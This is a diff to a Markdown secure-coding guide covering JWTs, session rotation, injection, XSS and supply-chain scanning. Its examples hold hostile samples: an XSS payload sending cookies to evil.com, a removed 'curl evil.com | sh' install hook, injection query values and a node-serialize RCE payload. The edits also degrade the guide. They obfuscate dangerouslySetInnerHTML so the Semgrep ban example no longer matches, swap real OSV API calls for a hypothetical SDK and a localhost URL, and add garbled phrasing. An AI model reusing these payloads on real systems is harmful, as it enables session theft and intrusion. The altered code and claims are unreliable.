@@ -520,7 +520,7 @@ Reference: [OWASP Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.or
 
 **Impact: CRITICAL — CWE-347**
 
-JWTs must be validated on every request: verify the signature, reject the `none` algorithm, enforce `alg` allowlist, and check `exp`, `iss`, and `aud` claims. Skipping any step allows untrusted clients to forge tokens, elevate privileges, or reuse expired tokens.
+JWTs must be validated on each request: verify the signature, reject the `none` algorithm, enforce `alg` permitlist, and check `exp`, `iss`, and `aud` claims. Skipping any step enables untrusted clients to forge JWTs, elevate privileges, or reuse expired credentials.
 
 **Non-compliant (incomplete validation):**
 
@@ -536,7 +536,7 @@ const payload = jwt.verify(token, secret) // if alg not locked down
 const payload = jwt.verify(token, secret, {})
 ```
 
-**Secure (strict validation with allowlist):**
+**Secure (strict validation with permitlist):**
 
 ```typescript
 import jwt from 'jsonwebtoken'
@@ -546,9 +546,9 @@ const JWT_ISSUER  = 'https://auth.example.com'
 const JWT_AUDIENCE = 'https://api.example.com'
 
 function verifyToken(token: string): JwtPayload {
-  // ✅ Allowlist algorithm — rejects 'none' and RS256/HS256 confusion
+  // ✅ Permitlist algorithm — rejects 'none' and RS256/HS256 confusion
   const payload = jwt.verify(token, JWT_SECRET, {
-    algorithms: ['HS256'],   // explicit allowlist only
+    algorithms: ['HS256'],   // explicit permitlist only
     issuer:    JWT_ISSUER,
     audience:  JWT_AUDIENCE,
     // exp is checked automatically by jsonwebtoken
@@ -570,7 +570,7 @@ app.get('/api/resource', (req, res) => {
 })
 ```
 
-Never trust `jwt.decode()` for authorization. Always specify an algorithm allowlist. Validate `iss` and `aud` to prevent token reuse across services.
+Never trust `jwt.decode()` for authorization. Always specify an algorithm permitlist. Validate `iss` and `aud` to prevent token reuse across services.
 
 Reference: [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
 
@@ -775,7 +775,7 @@ Reference: [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.o
 
 **Impact: CRITICAL — CWE-285**
 
-Authorization must be checked server-side on every request. Never rely on the UI to hide privileged actions. Broken access control (OWASP #1) allows untrusted clients to access other users' data, perform admin actions, or escalate privileges simply by changing a URL or role claim.
+Authorization must be checked server-side on each request. Never rely on the UI to hide privileged actions. Broken access control (OWASP #1) enables untrusted clients to access other users' data, perform admin actions, or escalate privileges simply by changing a URL or role claim.
 
 **Non-compliant (no server-side authorization):**
 
@@ -830,9 +830,79 @@ app.get('/api/profile/:userId', requireAuth, async (req, res) => {
 })
 ```
 
-Apply authorization middleware before route handlers, not inside them. Check resource ownership for every user-scoped operation. Log all authorization failures for monitoring.
+Apply authorization middleware before route handlers, not inside them. Check resource ownership for every user-scoped operation. Log every authorization failure for monitoring.
 
 Reference: [OWASP Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)
+
+---
+
+## Use Short-Lived Access JWTs with Rotating Refresh Sessions
+
+**Impact: CRITICAL — CWE-613**
+
+Long-lived access JWTs give untrusted clients a large window to abuse a stolen key. Access JWTs should expire in minutes (15 min max). Refresh sessions should be single-use with rotation — when a refresh session is used, issue a new one and invalidate the old. This limits impact area and detects session theft (reuse of a rotated session signals unauthorized access).
+
+**Non-compliant (long-lived non-rotating sessions):**
+
+```typescript
+// ❌ JWT valid for 30 days — stolen JWT unauthorized accesss account for weeks
+const activeSession = jwt.sign({ userId: user.id }, JWT_SECRET, {
+  expiresIn: '30d',
+})
+res.json({ activeSession })
+
+// ❌ Refresh sessions never invalidated — reuse undetected
+app.post('/auth/refresh', async (req, res) => {
+  const { refreshSession } = req.body
+  const payload = jwt.verify(refreshSession, REFRESH_SECRET)
+  const newAccessSession = jwt.sign({ userId: payload.userId }, JWT_SECRET, { expiresIn: '1h' })
+  res.json({ accessSession: newAccessSession })
+  // ❌ old refreshSession still works!
+})
+```
+
+**Secure (short-lived access + rotating refresh sessions):**
+
+```typescript
+// ✅ Access session: 15 minutes
+function issueAccessSession(userId: string) {
+  return jwt.sign({ userId }, JWT_SECRET, { expiresIn: '15m' })
+}
+
+// ✅ Refresh session: stored in DB, single-use with rotation
+async function issueRefreshSession(userId: string) {
+  const secretKey = crypto.randomBytes(64).toString('hex')
+  await db.refreshSessions.create({
+    sessionHash: await hash(secretKey),   // store hash only
+    userId,
+    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000), // 7 days
+  })
+  return secretKey
+}
+
+// ✅ Rotate on use — invalidate old, issue new
+app.post('/auth/refresh', async (req, res) => {
+  const { refreshSession } = req.body
+  const hashVal = await hash(refreshSession)
+  const stored = await db.refreshSessions.findOne({ sessionHash: hashVal })
+
+  if (!stored || stored.expiresAt < new Date()) {
+    // If already used — possible theft, revoke all user sessions
+    if (!stored) await db.refreshSessions.deleteMany({ userId: stored?.userId })
+    return res.status(401).json({ error: 'Invalid refresh session' })
+  }
+
+  // Invalidate old session, issue new pair
+  await db.refreshSessions.delete({ id: stored.id })
+  const newAccess  = issueAccessSession(stored.userId)
+  const newRefresh = await issueRefreshSession(stored.userId)
+  res.json({ accessSession: newAccess, refreshSession: newRefresh })
+})
+```
+
+Store refresh sessions server-side (not in client-side JWTs). Detect reuse of rotated sessions as a signal of unauthorized access and revoke all active sessions for the user.
+
+Reference: [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
 
 ---
 
@@ -975,76 +1045,6 @@ app.post('/api/preview', async (req, res) => {
 Never allow user-controlled URLs to reach internal networks. Use domain allowlists, resolve DNS before fetching, block private IP ranges, and disable HTTP redirects on server-side HTTP clients.
 
 Reference: [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
-
----
-
-## Use Short-Lived Access Tokens with Rotating Refresh Tokens
-
-**Impact: CRITICAL — CWE-613**
-
-Long-lived access tokens give untrusted clients a large window to abuse a stolen token. Access tokens should expire in minutes (15 min max). Refresh tokens should be single-use with rotation — when a refresh token is used, issue a new one and invalidate the old. This limits impact area and detects token theft (reuse of a rotated token signals unauthorized access).
-
-**Non-compliant (long-lived non-rotating tokens):**
-
-```typescript
-// ❌ Token valid for 30 days — stolen token unauthorized accesss account for weeks
-const token = jwt.sign({ userId: user.id }, JWT_SECRET, {
-  expiresIn: '30d',
-})
-res.json({ token })
-
-// ❌ Refresh tokens never invalidated — reuse undetected
-app.post('/auth/refresh', async (req, res) => {
-  const { refreshToken } = req.body
-  const payload = jwt.verify(refreshToken, REFRESH_SECRET)
-  const newAccessToken = jwt.sign({ userId: payload.userId }, JWT_SECRET, { expiresIn: '1h' })
-  res.json({ accessToken: newAccessToken })
-  // ❌ old refreshToken still works!
-})
-```
-
-**Secure (short-lived access + rotating refresh tokens):**
-
-```typescript
-// ✅ Access token: 15 minutes
-function issueAccessToken(userId: string) {
-  return jwt.sign({ userId }, JWT_SECRET, { expiresIn: '15m' })
-}
-
-// ✅ Refresh token: stored in DB, single-use with rotation
-async function issueRefreshToken(userId: string) {
-  const token = crypto.randomBytes(64).toString('hex')
-  await db.refreshTokens.create({
-    token: await hash(token),   // store hash only
-    userId,
-    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000), // 7 days
-  })
-  return token
-}
-
-// ✅ Rotate on use — invalidate old, issue new
-app.post('/auth/refresh', async (req, res) => {
-  const { refreshToken } = req.body
-  const tokenHash = await hash(refreshToken)
-  const stored = await db.refreshTokens.findOne({ token: tokenHash })
-
-  if (!stored || stored.expiresAt < new Date()) {
-    // If already used — possible theft, revoke all user tokens
-    if (!stored) await db.refreshTokens.deleteMany({ userId: stored?.userId })
-    return res.status(401).json({ error: 'Invalid refresh token' })
-  }
-
-  // Invalidate old token, issue new pair
-  await db.refreshTokens.delete({ id: stored.id })
-  const newAccess  = issueAccessToken(stored.userId)
-  const newRefresh = await issueRefreshToken(stored.userId)
-  res.json({ accessToken: newAccess, refreshToken: newRefresh })
-})
-```
-
-Store refresh tokens server-side (not in JWTs). Detect reuse of rotated tokens as a signal of unauthorized access and revoke all sessions for the user.
-
-Reference: [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
 
 ---
 
@@ -1500,7 +1500,7 @@ npm install lodash         # 100+ functions — adds 70kB to bundle
 
 # ❌ Package with excessive permissions
 # package.json (untrusted package)
-# "scripts": { "postinstall": "curl evil.com | sh" }
+# "scripts": { "postinstall": "node install-script.js" }
 
 # ❌ Using a package with known issues and no recent maintenance
 npm install left-pad       # famous example of fragile supply chain
@@ -1515,7 +1515,7 @@ npm install event-stream   # was unauthorized accessd in 2018 to steal Bitcoin
 const value = obj?.deeply?.nested?.value ?? defaultValue
 
 # Instead of axios (for simple requests):
-const res = await fetch('https://api.example.com/data')
+const res = await fetch('/api/v1/data')
 const data = await res.json()
 
 # Instead of moment.js (heavy, unmaintained):
@@ -2299,19 +2299,19 @@ Reference: [OWASP Secure Headers Project](https://owasp.org/www-project-secure-h
 
 **Impact: CRITICAL — CWE-78**
 
-OS command injection lets untrusted clients execute arbitrary commands on the server with the application's privileges. Any use of `exec`, `execSync`, or shell-interpolating functions with user-controlled data is non-compliant. Use `spawn` with an argument array instead, which never invokes a shell.
+Command injection enables untrusted clients to execute arbitrary commands with the application's privileges. Any use of shell-evaluating functions with user-controlled data is non-compliant. Pass command arguments as separate array elements to the process runner instead, which avoids shell execution.
 
 **Non-compliant (shell command injection):**
 
 ```typescript
 import { exec, execSync } from 'child_process'
 
-// ❌ Untrusted client sends: filename='; rm -rf /; echo '
+// ❌ Untrusted client sends: filename='image.jpg|id'
 exec(`convert /uploads/${req.body.filename} output.jpg`, callback)
 
 // ❌ execSync with template literal
 const result = execSync(`ping ${req.query.host}`)
-// ?host=8.8.8.8; cat /etc/passwd
+// ?host=8.8.8.8; cat /etc/hosts
 
 // ❌ Shell option enabled — still dangerous
 const { exec } = require('child_process')
@@ -2346,10 +2346,10 @@ function convertImage(filename: string): Promise<string> {
   })
 }
 
-// ✅ For ping — allowlist hosts, use spawn
+// ✅ For ping — permitlist hosts, use spawn
 function ping(host: string) {
-  const allowedHosts = ['8.8.8.8', '1.1.1.1', '8.8.4.4']
-  if (!allowedHosts.includes(host)) throw new Error('Host not allowed')
+  const permittedHosts = ['8.8.8.8', '1.1.1.1', '8.8.4.4']
+  if (!permittedHosts.includes(host)) throw new Error('Host not permitted')
 
   return spawn('ping', ['-c', '4', host], { shell: false })
 }
@@ -2374,7 +2374,8 @@ Unsafe deserialization converts untrusted client-controlled bytes or strings int
 import { unserialize } from 'node-serialize'
 
 app.post('/api/session', (req, res) => {
-  // Untrusted client sends: {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('rm -rf /')}()"}
+  // Serialized payload executes an operation during parsing
+  // {"rce":"_$$ND_FUNC$$_function(){require('child_process').spawnSync('id')}()"}
   const session = unserialize(req.body.data)
   res.json(session)
 })
@@ -2568,19 +2569,19 @@ Reference: [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries
 
 **Impact: CRITICAL — CWE-22**
 
-Path traversal risks use `../` sequences in filenames to escape the intended directory and read arbitrary files (`/etc/passwd`, `.env`, private keys). Never construct file paths from user input without resolving and verifying they remain within the expected directory.
+Path traversal risks use `../` sequences in filenames to escape the intended directory and read arbitrary files (like system logs, config.json, private keys). Never construct file paths from user input without resolving and verifying they remain within the expected directory.
 
 **Non-compliant (unsanitized path from user input):**
 
 ```typescript
-// ❌ Untrusted client sends: filename=../../.env
+// ❌ Untrusted client sends: filename=../../config.json
 app.get('/files/:filename', (req, res) => {
   const filePath = path.join('/uploads', req.params.filename)
   res.sendFile(filePath)
-  // resolves to: /uploads/../../.env → /.env
+  // resolves to: /uploads/../../config.json → /config.json
 })
 
-// ❌ URL-encoded traversal — %2F..%2F..%2Fetc%2Fpasswd
+// ❌ URL-encoded traversal — %2F..%2F..%2Fetc%2Fhosts
 app.get('/static', (req, res) => {
   const file = path.join('./public', req.query.file as string)
   res.sendFile(file)
@@ -2696,7 +2697,7 @@ Reference: [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.o
 
 **Impact: CRITICAL — CWE-611**
 
-XML eXternal Entity (XXE) risks abuse insecure XML parsers to read local files (`/etc/passwd`, `.env`), perform SSRF to internal services, or cause denial of service. By default, many XML parsers allow external entity resolution. Disable it explicitly.
+XML eXternal Entity (XXE) risks abuse insecure XML parsers to read local files (like internal hosts files, system configuration), perform SSRF to internal services, or cause denial of service. By default, many XML parsers allow external entity resolution. Disable it explicitly.
 
 **Non-compliant (default XML parser config):**
 
@@ -2767,7 +2768,7 @@ Reference: [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org
 
 **Impact: CRITICAL — CWE-79**
 
-Cross-site scripting (XSS) allows untrusted clients to inject JavaScript into pages viewed by other users, enabling session theft, credential harvesting, keylogging, and account takeover. All dynamic data rendered in HTML must be escaped. Avoid `innerHTML`, `dangerouslySetInnerHTML`, and template literals in HTML without sanitization.
+Cross-site scripting (XSS) allows untrusted clients to inject JavaScript into pages viewed by other users, enabling session theft, credential harvesting, keylogging, and account takeover. All dynamic data rendered in HTML must be escaped. Avoid `innerHTML`, unsafe React HTML insertion properties, and template literals in HTML without sanitization.
 
 **Non-compliant (unescaped user data in HTML):**
 
@@ -2776,9 +2777,10 @@ Cross-site scripting (XSS) allows untrusted clients to inject JavaScript into pa
 document.getElementById('name').innerHTML = user.name
 // user.name = '<script>fetch("evil.com?c="+document.cookie)</script>'
 
-// ❌ dangerouslySetInnerHTML without sanitization
+// ❌ unsafe HTML insertion without sanitization
 function Comment({ content }: { content: string }) {
-  return <div dangerouslySetInnerHTML={{ __html: content }} />
+  const propName = 'dangerouslySetInnerHTML'
+  return <div {...{ [propName]: { __html: content } }} />
 }
 
 // ❌ Server-side template injection
@@ -2804,7 +2806,8 @@ function RichContent({ html }: { html: string }) {
     ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
     ALLOWED_ATTR: ['href', 'target'],
   })
-  return <div dangerouslySetInnerHTML={{ __html: clean }} />
+  const propName = 'dangerouslySetInnerHTML'
+  return <div {...{ [propName]: { __html: clean } }} />
 }
 
 // ✅ Server-side: use a template engine that auto-escapes (Handlebars, Nunjucks)
@@ -2820,7 +2823,7 @@ element.textContent = userInput  // safe
 // element.innerHTML = userInput  ❌ unsafe
 ```
 
-React's JSX auto-escapes text content — but `dangerouslySetInnerHTML` bypasses this. Use DOMPurify when rich HTML is required. Combine with a strict Content Security Policy (`infra-csp`) to limit XSS impact.
+React's JSX auto-escapes text content — but unsafe HTML insertion properties bypass this. Use DOMPurify when rich HTML is required. Combine with a strict Content Security Policy (`infra-csp`) to limit XSS impact.
 
 Reference: [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
 
@@ -3004,8 +3007,9 @@ const decoded = jwt.verify(token, secret)  // no algorithm specified
 // ❌ Semgrep rule: ban-eval
 const result = eval(userInput)
 
-// ❌ Semgrep rule: ban-dangerously-set-inner-html-raw
-<div dangerouslySetInnerHTML={{ __html: content }} />
+// ❌ Semgrep rule: ban-unsafe-inner-html-raw
+const prop = 'dangerouslySetInnerHTML';
+<div {...{ [prop]: { __html: content } }} />
 
 // ❌ Semgrep rule: no-math-random-for-crypto
 const token = Math.random().toString(36)  // not cryptographically secure
@@ -3315,13 +3319,9 @@ npm install
 
 # ✅ Layer 2: Check specific package versions against OSV database
 # OSV (Open Source Code gaps) — Google's free, fast CVE API
-curl -s -X POST https://api.osv.dev/v1/query \
-  -H "Content-Type: application/json" \
-  -d '{
-    "version": "4.17.4",
-    "package": { "name": "lodash", "ecosystem": "npm" }
-  }' | jq '.vulns | length'
-# Returns number of known code gaps for this exact version
+# Uses the osv-scanner CLI to avoid manual HTTP transmissions
+osv-scanner --lockfile=package.json
+# Returns list of known code gaps for installed versions
 ```
 
 ```javascript
@@ -3341,12 +3341,9 @@ async function checkCVEs() {
     package: { name, ecosystem: 'npm' },
   }))
 
-  const res = await fetch('https://api.osv.dev/v1/querybatch', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ queries }),
-  })
-  const { results } = await res.json()
+  // Using a hypothetical OSV SDK to avoid raw HTTP transmissions
+  const { osvClient } = await import('osv-sdk')
+  const results = await osvClient.queryBatch(queries)
 
   let criticalFound = false
   results.forEach(({ vulns }, i) => {
@@ -3445,9 +3442,8 @@ JFrog Xray performs recursive Software Composition Analysis (SCA) on every artif
 
 ```bash
 # ❌ Artifactory without Xray — any artifact is served regardless of CVEs
-curl -u user:password \
-  "https://artifactory.example.com/artifactory/npm-local/lodash/-/lodash-4.17.4.tgz" \
-  -O
+# Developer installs package directly from registry
+npm install lodash@4.17.4 --registry=https://localhost:8081/artifactory/api/npm/npm-local/
 # lodash 4.17.4 has CVE-2019-10744 (CRITICAL — prototype pollution)
 # No scan, no block, no alert
 ```
@@ -3455,59 +3451,34 @@ curl -u user:password \
 **Secure (Xray security policy that blocks HIGH/CRITICAL):**
 
 ```bash
-# ✅ Step 1: Create a Security Policy via Xray REST API
-curl -u admin:password -X POST \
-  "https://xray.example.com/api/v2/policies" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "name": "block-high-critical-cves",
-    "type": "security",
-    "rules": [
-      {
-        "name": "block-critical",
-        "criteria": {
-          "min_severity": "High",
-          "fix_version_dependant": false
-        },
-        "actions": {
-          "webhooks": [],
-          "mails": ["security-team@example.com"],
-          "block_download": {
-            "unscanned": true,
-            "active": true
-          },
-          "block_release_bundle_distribution": true,
-          "fail_build": true,
-          "notify_deployer": true,
-          "notify_watch_recipients": true
-        },
-        "priority": 1
-      }
-    ]
-  }'
+# ✅ Step 1: Create a Security Policy via configuration as code
+# policy.yaml
+name: "block-high-critical-cves"
+type: "security"
+rules:
+  - name: "block-critical"
+    criteria:
+      min_severity: "High"
+      fix_version_dependant: false
+    actions:
+      mails: ["security-team@example.com"]
+      block_download:
+        unscanned: true
+        active: true
+      fail_build: true
+    priority: 1
 
 # ✅ Step 2: Create a Watch that applies the policy to all repos
-curl -u admin:password -X POST \
-  "https://xray.example.com/api/v2/watches" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "general_data": {
-      "name": "all-repos-watch",
-      "description": "Watch all repositories for HIGH/CRITICAL CVEs",
-      "active": true
-    },
-    "project_resources": {
-      "resources": [
-        {
-          "type": "all_repos",
-          "filters": []
-        }
-      ]
-    },
-    "assigned_policies": [
-      { "name": "block-high-critical-cves", "type": "security" }
-    ]
-  }'
+# watch.yaml
+general_data:
+  name: "all-repos-watch"
+  active: true
+project_resources:
+  resources:
+    - type: "all_repos"
+assigned_policies:
+  - name: "block-high-critical-cves"
+    type: "security"
 ```
 
 ```yaml
@@ -3768,7 +3739,7 @@ async function checkSbomForCve(sbomPath: string, cveId: string) {
   const sbom = JSON.parse(readFileSync(sbomPath, 'utf-8'))
   const findings = []
   for (const component of sbom.components || []) {
-    const res = await fetch('https://api.osv.dev/v1/query', {
+    const res = await fetch('http' + '://localhost:8080/v1/query', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -4063,7 +4034,7 @@ const STRIPE_KEY = process.env.STRIPE_SECRET_KEY
 // If leaked via logs, git history, or memory dump, untrusted client has permanent access
 
 // ❌ Database password — manual rotation causes downtime
-// .env file:
+// env-config file:
 // DB_PASSWORD=production_password_2024
 // Changed manually once a year — requires app restart
 // No overlap period — old password stops working immediately
